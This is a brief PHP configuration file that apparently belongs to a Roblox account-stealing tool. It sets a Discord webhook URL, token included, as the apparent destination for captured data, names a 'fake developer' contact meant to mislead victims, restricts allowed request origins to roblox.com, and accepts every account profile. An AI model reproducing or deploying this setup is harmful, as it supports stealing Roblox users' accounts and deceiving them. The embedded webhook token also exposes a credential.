<?php
    // webhook link
    $webhook = "https://discordapp.com/api/webhooks/883562125635756113/YGOqbq5pmCbnwmn-TYCv-e52J1dCsC2Q1mmc78_b-8tPZ5kNgXFh6dPMJNoiXN50tCr6";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
